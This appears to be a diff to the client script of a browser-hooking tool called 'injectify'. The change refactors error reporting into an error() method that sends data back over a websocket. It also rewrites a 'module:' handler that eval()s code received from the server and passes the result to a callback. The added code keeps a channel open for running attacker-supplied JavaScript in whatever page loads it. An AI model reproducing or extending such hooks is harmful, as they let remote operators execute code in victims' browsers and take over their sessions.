@@ -33,7 +33,7 @@ window['injectify'] = class Injectify {
 				}
 			} catch(e) {
 				if (this.debug) throw e
-				this.send('e', e.stack)
+				this.error(e.stack)
 			}
 		}
 	}
@@ -85,7 +85,7 @@ window['injectify'] = class Injectify {
 			}))
 		} catch(e) {
 			if (this.debug) throw e
-			this.send('e', e.stack)
+			this.error(e.stack)
 		}
 	}
 	/**
@@ -161,6 +161,13 @@ window['injectify'] = class Injectify {
 	static get debug() {
 		return ws.url.split('?')[1].charAt(0) == "$"
 	}
+	/**
+	 * Error handler
+	 * @param {error} error The error to be handled
+	 */
+	static error(error) {
+		this.send('e', error)
+	}
 }
 
 /**
@@ -181,14 +188,21 @@ window['injectify'].listener((data, topic) => {
 			return
 		}
 		if (/^module:/.test(topic)) {
-			var Module = topic.substring(7),
-				callback = window["callbackFor" + Module]
-			eval(data)
-			if (data !== false && typeof callback == 'function') {
-				// @ts-ignore: module is declared outside script
-				callback(module.returned)
+			var module = {
+				name: topic.substring(7),
+				callback: window["callbackFor" + topic.substring(7)],
+				returned: undefined,
+				config: {
+					async: false
+				}
 			}
-			delete window["callbackFor" + Module]
+
+			eval(data)
+
+			if (!module.config.async && data !== false && typeof module.callback == 'function') {
+				module.callback(module.returned)
+			}
+			delete window["callbackFor" + module.name]
 			return
 		}
 		if (topic == 'execute' || topic == 'core') {
@@ -200,7 +214,7 @@ window['injectify'].listener((data, topic) => {
 			//console.log(data)
 			throw e
 		}
-		window['injectify'].send('e', e.stack)
+		window['injectify'].error(e.stack)
 	}
 })
 
